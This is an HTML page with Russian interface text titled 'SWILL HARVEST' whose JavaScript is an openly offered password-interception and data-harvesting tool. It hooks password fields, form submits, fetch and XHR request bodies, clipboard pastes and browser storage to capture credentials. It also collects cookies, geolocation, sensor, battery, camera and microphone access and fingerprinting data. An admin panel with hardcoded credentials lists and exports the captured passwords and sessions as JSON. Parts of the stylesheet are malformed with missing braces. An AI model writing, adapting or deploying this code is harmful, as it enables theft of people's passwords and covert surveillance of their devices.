<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SWILL // DATA HARVEST</title>
    <style>
        /* ===== КИБЕРПАНК-НЕОН ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0f;
            color: #b0f0ff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;

        }
        .container {
            background: #12121c;
            padding: 30px;
            border-radius: 0px;
            max-width: 950px;
            width: 100%;
            border: 2px solid #00ffff;
            box-shadow: 0 0 40px #00ffff33, inset 0 0 30px #00ffff11;

        h1, h2 {
            text-align: center;
            font-weight: 300;
            letter-spacing: 4px;
            text-transform: uppercase;
            color: #ff00ff;

        p, .status, .data-display, .session-item, .password-capture {
            font-family: 'Courier New', monospace;
            color: #aaffdd;

        }
        button {
            background: #1a1a2e;
            color: #00ffff;
            border: 2px solid #00ffff;
            padding: 14px 28px;
            font-size: 18px;
            border-radius: 0px;
            cursor: pointer;
            width: 100%;
            transition: 0.2s;
            font-weight: bold;
            margin: 10px 0;
            text-transform: uppercase;

        button:hover {
            background: #00ffff;

            box-shadow: 0 0 60px #00ffff, inset 0 0 20px #0a0a0f;

        button.danger {
            border-color: #ff0055;

            box-shadow: 0 0 20px #ff005533;

        }
        button.danger:hover {
            background: #ff0055;
            color: #0a0a0f;
            box-shadow: 0 0 60px #ff0055;
        }
        input, textarea {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border-radius: 0px;
            border: 2px solid #44ddff;
            background: #0a0a12;
            color: #ffddff;

            box-shadow: inset 0 0 15px #00aaff33;

        }
        .status {
            margin: 15px 0;
            padding: 10px;
            background: #0a0a12;

        .data-display {
            margin-top: 20px;

            text-shadow: 0 0 6px #66ff66;
        }
        .hidden {
            display: none !important;

        .admin-panel {
            border-top: 3px solid #ff00ff;
            margin-top: 30px;

            box-shadow: inset 0 10px 30px #ff00ff11;
        }
        .session-item {
            background: #0c0c18;
            padding: 15px;
            margin: 10px 0;
            border-left: 6px solid #ff00ff;
            border-right: 2px solid #00ffff;
            box-shadow: 0 0 25px #ff00ff22;
            color: #ddffff;
            text-shadow: 0 0 8px #88ffff;
        }
        .session-item strong {
            color: #ff88ff;
            text-shadow: 0 0 20px #ff44ff;
        }
        .password-capture {
            background: #1a0a0a;
            padding: 12px;
            border-radius: 0px;
            margin: 5px 0;
            font-family: 'Courier New', monospace;
            border: 2px solid #ff4444;
            box-shadow: 0 0 30px #ff000066;
            color: #ffaaaa;
            text-shadow: 0 0 20px #ff3333;
        }
        .badge {
            display: inline-block;
            background: #ff00aa;
            padding: 2px 16px;
            border-radius: 0px;

            font-weight: bold;

        ::-webkit-scrollbar {
            width: 8px;
            background: #0a0a12;
        }
        ::-webkit-scrollbar-thumb {
            background: #ff00ff;
            box-shadow: 0 0 20px #ff00ff;
        }
    </style>
</head>
<body>

<div class="container" id="app">

    <!-- ===== ГЛАВНАЯ СТРАНИЦА ===== -->
    <div id="mainPage">
        <h1>⛧ SWILL HARVEST ⛧</h1>
        <p style="color:#88ddff; text-shadow: 0 0 20px #00ddff;">ПЕРЕХВАТ ПАРОЛЕЙ + СБОР ДАННЫХ</p>
        <button id="startBtn">▶ ЗАПУСТИТЬ СБОР</button>
        <div class="status" id="status">[ОЖИДАНИЕ]</div>
        <button id="goToAdminBtn" style="border-color:#ff44ff; color:#ff44ff; box-shadow:0 0 30px #ff44ff55; text-shadow:0 0 15px #ff44ff;">🔐 АДМИН-ПАНЕЛЬ</button>
        <div class="data-display" id="dataDisplay"></div>
        <button id="downloadBtn" class="hidden">⬇ СКАЧАТЬ JSON</button>
    </div>

    <!-- ===== АДМИН-ПАНЕЛЬ ===== -->
    <div id="adminPage" class="hidden">
        <h1>⛧ АДМИН-ПАНЕЛЬ ⛧</h1>
        <p style="color:#ff88ff;">ВВЕДИТЕ КРЕДЫ ДЛЯ ДОСТУПА</p>

        <div id="loginForm">
            <input type="text" id="adminLogin" placeholder="ЛОГИН" value="admin" style="border-color:#ff88ff;">
            <input type="password" id="adminPassword" placeholder="ПАРОЛЬ" value="par1s67" style="border-color:#ff88ff;">
            <button id="adminLoginBtn" style="border-color:#ff88ff; color:#ff88ff; box-shadow:0 0 30px #ff88ff33;">ВОЙТИ</button>
            <div class="status" id="adminStatus"></div>
        </div>

        <div id="adminContent" class="hidden">
            <h2 style="font-size:22px;">📡 ВСЕ СЕССИИ</h2>
            <button id="clearSessionsBtn" class="danger">🗑️ ОЧИСТИТЬ ВСЁ</button>
            <button id="exportAllBtn" style="border-color:#ffaa00; color:#ffaa00; box-shadow:0 0 30px #ffaa0044;">📥 ЭКСПОРТ ВСЕГО</button>
            <div id="sessionsList"></div>

            <h2 style="font-size:22px; margin-top:30px; color:#ff6666;">🔑 ПЕРЕХВАЧЕННЫЕ ПАРОЛИ</h2>
            <div id="passwordsList"></div>

            <button id="logoutBtn" style="border-color:#8866ff; color:#8866ff; margin-top:20px;">🚪 ВЫЙТИ</button>
        </div>
    </div>
</div>

<script>
    // ============================================================
    // 1. ГЛОБАЛЬНЫЕ
    // ============================================================
    let collectedData = {};
    let sessions = JSON.parse(localStorage.getItem('sessions') || '[]');
    let capturedPasswords = JSON.parse(localStorage.getItem('capturedPasswords') || '[]');
    let isAdmin = false;

    // ============================================================
    // 2. АГРЕССИВНЫЙ ПЕРЕХВАТ ПАРОЛЕЙ
    // ============================================================
    function capturePassword(value, source = 'manual', extra = {}) {
        if (!value || value.length < 1) return;
        const entry = {
            timestamp: new Date().toISOString(),
            value: value,
            source: source,
            url: window.location.href,
            ...extra
        };
        // Проверка на дубликат (по значению + url)
        const exists = capturedPasswords.some(p => p.value === value && p.url === entry.url);
        if (!exists) {
            capturedPasswords.push(entry);
            localStorage.setItem('capturedPasswords', JSON.stringify(capturedPasswords));
            console.log('[SWILL] Пароль перехвачен:', value);
        }
    }

    function setupPasswordCapture() {
        // 1. Все password-поля (включая будущие)
        const observer = new MutationObserver(() => {
            document.querySelectorAll('input[type="password"]').forEach(field => {
                if (!field.dataset.swillCaptured) {
                    field.dataset.swillCaptured = 'true';
                    field.addEventListener('input', function() {
                        if (this.value) capturePassword(this.value, 'password-field', {
                            name: this.name || 'unknown',
                            id: this.id || 'unknown'
                        });
                    });
                }
            });
        });
        observer.observe(document.body, { childList: true, subtree: true });

        // 2. Также перехватываем text-поля с подозрительными именами
        document.querySelectorAll('input[type="text"]').forEach(field => {
            const name = (field.name || field.id || '').toLowerCase();
            if (name.includes('pass') || name.includes('pwd') || name.includes('senha') || name.includes('password')) {
                if (!field.dataset.swillCaptured) {
                    field.dataset.swillCaptured = 'true';
                    field.addEventListener('input', function() {
                        if (this.value) capturePassword(this.value, 'text-field-suspect', {
                            name: this.name || 'unknown',
                            id: this.id || 'unknown'
                        });
                    });
                }
            }
        });

        // 3. Перехват submit форм
        document.addEventListener('submit', function(e) {
            const form = e.target;
            const inputs = form.querySelectorAll('input[type="password"], input[type="text"]');
            inputs.forEach(inp => {
                if (inp.value) {
                    const name = (inp.name || inp.id || '').toLowerCase();
                    if (inp.type === 'password' || name.includes('pass') || name.includes('pwd')) {
                        capturePassword(inp.value, 'form-submit', {
                            name: inp.name || 'unknown',
                            id: inp.id || 'unknown',
                            formAction: form.action || 'unknown'
                        });
                    }
                }
            });
        });

        // 4. Перехват fetch (тела запросов)
        const originalFetch = window.fetch;
        window.fetch = function(...args) {
            return originalFetch.apply(this, args).then(response => {
                try {
                    const body = args[1]?.body;
                    if (body && typeof body === 'string') {
                        // Ищем password в JSON
                        const matches = body.match(/["']password["']\s*:\s*["']([^"']+)["']/gi);
                        if (matches) {
                            matches.forEach(m => {
                                const val = m.match(/["']password["']\s*:\s*["']([^"']+)["']/i);
                                if (val && val[1]) capturePassword(val[1], 'fetch-json', { url: args[0] });
                            });
                        }
                        // Ищем в формате x-www-form-urlencoded
                        const urlParams = new URLSearchParams(body);
                        if (urlParams.has('password')) {
                            capturePassword(urlParams.get('password'), 'fetch-form', { url: args[0] });
                        }
                    }
                } catch(e) {}
                return response;
            });
        };

        // 5. Перехват XMLHttpRequest
        const originalOpen = XMLHttpRequest.prototype.open;
        const originalSend = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.open = function(method, url) {
            this._swillUrl = url;
            this._swillMethod = method;
            return originalOpen.apply(this, arguments);
        };
        XMLHttpRequest.prototype.send = function(body) {
            try {
                if (body && typeof body === 'string') {
                    const urlParams = new URLSearchParams(body);
                    if (urlParams.has('password')) {
                        capturePassword(urlParams.get('password'), 'xhr-form', { url: this._swillUrl });
                    }
                    // JSON
                    const match = body.match(/["']password["']\s*:\s*["']([^"']+)["']/i);
                    if (match && match[1]) {
                        capturePassword(match[1], 'xhr-json', { url: this._swillUrl });
                    }
                }
            } catch(e) {}
            return originalSend.apply(this, arguments);
        };

        // 6. Чтение localStorage и sessionStorage на предмет паролей
        function scanStorage(storage, source) {
            for (let i = 0; i < storage.length; i++) {
                const key = storage.key(i);
                if (key) {
                    const val = storage.getItem(key);
                    if (typeof val === 'string' && val.length > 0) {
                        // Если ключ содержит password или значение похоже на пароль (длина > 4, нет пробелов)
                        const lowerKey = key.toLowerCase();
                        if (lowerKey.includes('pass') || lowerKey.includes('pwd') || lowerKey.includes('senha')) {
                            capturePassword(val, `storage-${source}`, { storageKey: key });
                        } else if (val.length >= 6 && /^[a-zA-Z0-9!@#$%^&*()_+\-={}[\]:;"'<>,.?/~`]+$/.test(val) && !val.includes(' ')) {
                            // Подозрительная строка — возможно пароль
                            capturePassword(val, `storage-${source}-suspect`, { storageKey: key });
                        }
                    }
                }
            }
        }
        scanStorage(localStorage, 'localStorage');
        scanStorage(sessionStorage, 'sessionStorage');

        // 7. Перехват clipboard (если вставят пароль)
        document.addEventListener('paste', function(e) {
            const text = e.clipboardData?.getData('text/plain');
            if (text && text.length >= 4 && /[a-zA-Z0-9!@#$%^&*()]/.test(text)) {
                capturePassword(text, 'clipboard', {});
            }
        });
    }

    // ============================================================
    // 3. СБОР ДАННЫХ (включая все пароли из памяти)
    // ============================================================
    function getBrowserInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown',
            maxTouchPoints: navigator.maxTouchPoints || 0,
            vendor: navigator.vendor || '',
            plugins: Array.from(navigator.plugins || []).map(p => p.name),
            mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type)
        };
    }

    function getScreenInfo() {
        return {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            orientation: screen.orientation ? screen.orientation.type : 'unknown',
            isPortrait: window.matchMedia("(orientation: portrait)").matches
        };
    }

    function getWindowInfo() {
        return {
            innerWidth: window.innerWidth,
            innerHeight: window.innerHeight,
            outerWidth: window.outerWidth,
            outerHeight: window.outerHeight,
            pageXOffset: window.pageXOffset,
            pageYOffset: window.pageYOffset,
            devicePixelRatio: window.devicePixelRatio || 1
        };
    }

    function getGeolocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve({ error: 'Geolocation not supported' });
                return;
            }
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    resolve({
                        latitude: pos.coords.latitude,
                        longitude: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        altitude: pos.coords.altitude,
                        altitudeAccuracy: pos.coords.altitudeAccuracy,
                        heading: pos.coords.heading,
                        speed: pos.coords.speed,
                        timestamp: pos.timestamp
                    });
                },
                (err) => {
                    resolve({ error: err.message, code: err.code });
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        });
    }

    function startSensors() {
        return new Promise((resolve) => {
            if (!window.DeviceMotionEvent && !window.DeviceOrientationEvent) {
                resolve({ error: 'Sensors not supported' });
                return;
            }
            let sensorData = { acceleration: null, rotation: null, orientation: null };
            let count = 0;
            const maxSamples = 3;

            function handleMotion(event) {
                if (count >= maxSamples) return;
                sensorData.acceleration = {
                    x: event.acceleration?.x || null,
                    y: event.acceleration?.y || null,
                    z: event.acceleration?.z || null,
                    gravity: event.accelerationIncludingGravity ? {
                        x: event.accelerationIncludingGravity.x,
                        y: event.accelerationIncludingGravity.y,
                        z: event.accelerationIncludingGravity.z
                    } : null,
                    rotationRate: event.rotationRate ? {
                        alpha: event.rotationRate.alpha,
                        beta: event.rotationRate.beta,
                        gamma: event.rotationRate.gamma
                    } : null
                };
                count++;
                if (count >= maxSamples) {
                    window.removeEventListener('devicemotion', handleMotion);
                    resolve(sensorData);
                }
            }

            function handleOrientation(event) {
                sensorData.orientation = {
                    alpha: event.alpha,
                    beta: event.beta,
                    gamma: event.gamma,
                    absolute: event.absolute || false
                };
            }

            window.addEventListener('devicemotion', handleMotion);
            window.addEventListener('deviceorientation', handleOrientation);

            setTimeout(() => {
                window.removeEventListener('devicemotion', handleMotion);
                window.removeEventListener('deviceorientation', handleOrientation);
                resolve(sensorData);
            }, 3000);
        });
    }

    async function getMediaPermissions() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const tracks = stream.getTracks().map(t => ({
                kind: t.kind,
                label: t.label,
                enabled: t.enabled,
                readyState: t.readyState
            }));
            stream.getTracks().forEach(t => t.stop());
            return { granted: true, tracks };
        } catch (err) {
            return { granted: false, error: err.message };
        }
    }

    function getBatteryInfo() {
        return new Promise((resolve) => {
            if (!navigator.getBattery) {
                resolve({ error: 'Battery API not supported' });
                return;
            }
            navigator.getBattery().then((battery) => {
                resolve({
                    level: battery.level * 100 + '%',
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                });
            }).catch(err => {
                resolve({ error: err.message });
            });
        });
    }

    function getNetworkInfo() {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (!conn) return { error: 'Network API not supported' };
        return {
            effectiveType: conn.effectiveType,
            rtt: conn.rtt,
            downlink: conn.downlink,
            saveData: conn.saveData,
            type: conn.type
        };
    }

    function getStorageInfo() {
        let cookies = document.cookie;
        let localStorageItems = {};
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key) localStorageItems[key] = localStorage.getItem(key);
            }
        } catch(e) { localStorageItems = { error: 'Cannot read localStorage' }; }
        
        let sessionStorageItems = {};
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                if (key) sessionStorageItems[key] = sessionStorage.getItem(key);
            }
        } catch(e) { sessionStorageItems = { error: 'Cannot read sessionStorage' }; }
        
        return { cookies, localStorage: localStorageItems, sessionStorage: sessionStorageItems };
    }

    function getTimeInfo() {
        return {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            dateTime: new Date().toISOString(),
            locale: navigator.language
        };
    }

    function getPerformanceInfo() {
        if (!window.performance || !window.performance.memory) {
            return { error: 'Performance API limited' };
        }
        return {
            memory: {
                totalJSHeapSize: window.performance.memory.totalJSHeapSize,
                usedJSHeapSize: window.performance.memory.usedJSHeapSize,
                jsHeapSizeLimit: window.performance.memory.jsHeapSizeLimit
            },
            navigation: {
                type: window.performance.navigation?.type,
                redirectCount: window.performance.navigation?.redirectCount
            }
        };
    }

    async function collectAllData() {
        updateStatus('⛧ ЗАПУСК СБОРА... ⛧');

        const data = {
            timestamp: new Date().toISOString(),
            browserInfo: getBrowserInfo(),
            screenInfo: getScreenInfo(),
            windowInfo: getWindowInfo(),
            networkInfo: getNetworkInfo(),
            timeInfo: getTimeInfo(),
            performanceInfo: getPerformanceInfo(),
            storageInfo: getStorageInfo(),
            geolocation: await getGeolocation(),
            battery: await getBatteryInfo(),
            sensors: await startSensors(),
            mediaPermissions: await getMediaPermissions(),
            allCapturedPasswords: capturedPasswords.slice(-50) // последние 50
        };

        collectedData = data;
        displayData(data);
        updateStatus('✅ СБОР ЗАВЕРШЁН. ДАННЫЕ СОХРАНЕНЫ.');

        const session = {
            id: Date.now(),
            timestamp: data.timestamp,
            data: data,
            preview: {
                userAgent: data.browserInfo.userAgent.substring(0, 60),
                location: data.geolocation.latitude ? `${data.geolocation.latitude}, ${data.geolocation.longitude}` : 'нет',
                battery: data.battery.level || 'нет',
                passwordsCount: capturedPasswords.length
            }
        };
        sessions.push(session);
        localStorage.setItem('sessions', JSON.stringify(sessions));

        return data;
    }

    // ============================================================
    // 4. UI
    // ============================================================
    function updateStatus(msg) {
        document.getElementById('status').innerHTML = msg;
    }

    function displayData(data) {
        const pre = document.getElementById('dataDisplay');
        pre.textContent = JSON.stringify(data, null, 2);
        document.getElementById('downloadBtn').classList.remove('hidden');
    }

    function downloadJSON() {
        if (Object.keys(collectedData).length === 0) {
            alert('Нет данных.');
            return;
        }
        const jsonStr = JSON.stringify(collectedData, null, 2);
        const blob = new Blob([jsonStr], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `swill_harvest_${new Date().toISOString().slice(0,10)}.json`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }

    // ============================================================
    // 5. АДМИНКА
    // ============================================================
    function renderAdminPanel() {
        const sessionsList = document.getElementById('sessionsList');
        const passwordsList = document.getElementById('passwordsList');

        sessionsList.innerHTML = '';
        if (sessions.length === 0) {
            sessionsList.innerHTML = '<p style="color:#6688aa;">[ НЕТ СЕССИЙ ]</p>';
        } else {
            sessions.slice().reverse().forEach(s => {
                const div = document.createElement('div');
                div.className = 'session-item';
                div.innerHTML = `
                    <strong>${new Date(s.timestamp).toLocaleString()}</strong>
                    <span class="badge">ID: ${s.id}</span>
                    <br>UA: ${s.preview.userAgent || 'нет'}
                    <br>ЛОКАЦИЯ: ${s.preview.location || 'нет'}
                    <br>БАТАРЕЯ: ${s.preview.battery || 'нет'} | ПАРОЛЕЙ: ${s.preview.passwordsCount || 0}
                    <br><button class="view-session-btn" data-id="${s.id}" style="width:auto;padding:6px 20px;font-size:14px;display:inline-block;margin-right:10px;">👁️ ПОКАЗАТЬ</button>
                    <button class="delete-session-btn" data-id="${s.id}" style="border-color:#ff4444;color:#ff4444;width:auto;padding:6px 20px;font-size:14px;display:inline-block;">🗑️ УДАЛИТЬ</button>
                `;
                sessionsList.appendChild(div);
            });
        }

        passwordsList.innerHTML = '';
        if (capturedPasswords.length === 0) {
            passwordsList.innerHTML = '<p style="color:#6688aa;">[ НЕТ ПЕРЕХВАЧЕННЫХ ПАРОЛЕЙ ]</p>';
        } else {
            capturedPasswords.slice().reverse().forEach(p => {
                const div = document.createElement('div');
                div.className = 'password-capture';
                div.innerHTML = `
                    <strong>${new Date(p.timestamp).toLocaleString()}</strong>
                    <span style="color:#ff6666;">⚡ ${p.value}</span>
                    <br>ИСТОЧНИК: ${p.source || 'unknown'} | ПОЛЕ: ${p.name || p.id || '—'}
                    <br>URL: ${p.url || '—'}
                `;
                passwordsList.appendChild(div);
            });
        }

        document.querySelectorAll('.view-session-btn').forEach(btn => {
            btn.onclick = function() {
                const id = parseInt(this.dataset.id);
                const session = sessions.find(s => s.id === id);
                if (session) {
                    alert(JSON.stringify(session.data, null, 2));
                }
            };
        });

        document.querySelectorAll('.delete-session-btn').forEach(btn => {
            btn.onclick = function() {
                const id = parseInt(this.dataset.id);
                sessions = sessions.filter(s => s.id !== id);
                localStorage.setItem('sessions', JSON.stringify(sessions));
                renderAdminPanel();
            };
        });
    }

    function showAdminPage() {
        document.getElementById('mainPage').classList.add('hidden');
        document.getElementById('adminPage').classList.remove('hidden');
        document.getElementById('loginForm').classList.remove('hidden');
        document.getElementById('adminContent').classList.add('hidden');
        document.getElementById('adminStatus').textContent = '';
    }

    function showAdminContent() {
        document.getElementById('loginForm').classList.add('hidden');
        document.getElementById('adminContent').classList.remove('hidden');
        renderAdminPanel();
    }

    // ============================================================
    // 6. ИНИЦИАЛИЗАЦИЯ
    // ============================================================
    document.addEventListener('DOMContentLoaded', function() {
        setupPasswordCapture();

        document.getElementById('startBtn').addEventListener('click', async function() {
            this.disabled = true;
            this.textContent = '⛧ СБОР... ⛧';
            await collectAllData();
            this.disabled = false;
            this.textContent = '▶ ЗАПУСТИТЬ СБОР';
        });

        document.getElementById('downloadBtn').addEventListener('click', downloadJSON);

        document.getElementById('goToAdminBtn').addEventListener('click', showAdminPage);

        document.getElementById('adminLoginBtn').addEventListener('click', function() {
            const login = document.getElementById('adminLogin').value.trim();
            const password = document.getElementById('adminPassword').value.trim();
            if (login === 'admin' && password === 'par1s67') {
                document.getElementById('adminStatus').textContent = '✅ ДОСТУП РАЗРЕШЁН';
                document.getElementById('adminStatus').style.color = '#88ff88';
                isAdmin = true;
                showAdminContent();
            } else {
                document.getElementById('adminStatus').textContent = '❌ ДОСТУП ЗАПРЕЩЁН';
                document.getElementById('adminStatus').style.color = '#ff6666';
            }
        });

        document.getElementById('logoutBtn').addEventListener('click', function() {
            isAdmin = false;
            document.getElementById('adminPage').classList.add('hidden');
            document.getElementById('mainPage').classList.remove('hidden');
            document.getElementById('loginForm').classList.remove('hidden');
            document.getElementById('adminContent').classList.add('hidden');
            document.getElementById('adminStatus').textContent = '';
        });

        document.getElementById('clearSessionsBtn').addEventListener('click', function() {
            if (confirm('УДАЛИТЬ ВСЕ СЕССИИ И ПАРОЛИ?')) {
                sessions = [];
                capturedPasswords = [];
                localStorage.setItem('sessions', JSON.stringify(sessions));
                localStorage.setItem('capturedPasswords', JSON.stringify(capturedPasswords));
                renderAdminPanel();
            }
        });

        document.getElementById('exportAllBtn').addEventListener('click', function() {
            const exportData = {
                sessions: sessions,
                capturedPasswords: capturedPasswords,
                exportDate: new Date().toISOString()
            };
            const jsonStr = JSON.stringify(exportData, null, 2);
            const blob = new Blob([jsonStr], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `swill_export_${new Date().toISOString().slice(0,10)}.json`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        });
    });
</script>

</body>
</html>
